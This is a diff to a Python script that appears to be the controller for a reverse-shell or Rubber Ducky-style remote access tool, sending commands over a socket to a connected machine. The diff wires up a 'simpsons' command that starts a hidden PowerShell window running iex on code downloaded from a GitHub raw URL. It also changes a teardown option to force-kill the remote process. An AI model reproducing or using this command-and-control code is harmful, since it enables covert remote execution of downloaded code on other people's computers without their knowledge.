@@ -147,7 +147,7 @@ while not stop:
             if "-s" in options:
                 commands.append("signature")
             if "-p" in options:
-                commands.append("exit")
+                commands.append("taskkill /f /pid $pid")
             stdin = "; ".join(commands)
             stop = True
         elif ducky_command[:5] == "clear":
@@ -272,9 +272,12 @@ while not stop:
         elif ducky_command[:8] == "simpsons":
             commands = []
             commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/simpsons).content\'")
+            stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
             stdin = ""
+    elif stdin.startswith("k ") and stdin[2] != "\"":
+        stdin = "k \"" + stdin[2:] + "\""
     last = stdin
     conn.send((stdin + "\n").encode())
 s.close()
